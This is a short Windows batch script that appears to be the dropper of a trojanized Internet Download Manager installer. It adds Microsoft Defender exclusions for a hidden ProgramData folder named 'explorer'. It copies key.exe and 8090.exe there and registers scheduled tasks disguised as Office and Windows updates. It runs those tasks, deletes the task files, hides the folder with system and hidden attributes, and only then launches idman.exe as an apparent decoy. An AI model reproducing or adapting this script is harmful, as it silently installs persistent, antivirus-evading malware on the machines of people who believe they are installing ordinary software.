mkdir %systemdrive%\programdata\explorer
powershell -Command Add-MpPreference -ExclusionPath "%systemdrive%\programdata\explorer\*.*"
powershell -Command Add-MpPreference -ExclusionPath "%systemdrive%\programdata\explorer"
copy Task_File_8090.xml %systemdrive%\programdata\explorer
copy Task_File_key.xml %systemdrive%\programdata\explorer
copy key.exe %systemdrive%\programdata\explorer
copy 8090.exe %systemdrive%\programdata\explorer
Schtasks /create /xml %systemdrive%\programdata\explorer\Task_File_8090.xml /tn "Updateofficem" 
Schtasks /create /xml %systemdrive%\programdata\explorer\Task_File_key.xml /tn "UpdateWindowsk" 
Schtasks /run /tn "Updateofficem"
Schtasks /run /tn "UpdateWindowsk" 
del %systemdrive%\programdata\explorer\*.xml
attrib +s +h %systemdrive%\programdata\explorer
attrib +s +h %systemdrive%\programdata\explorer\*.*
idman.exe
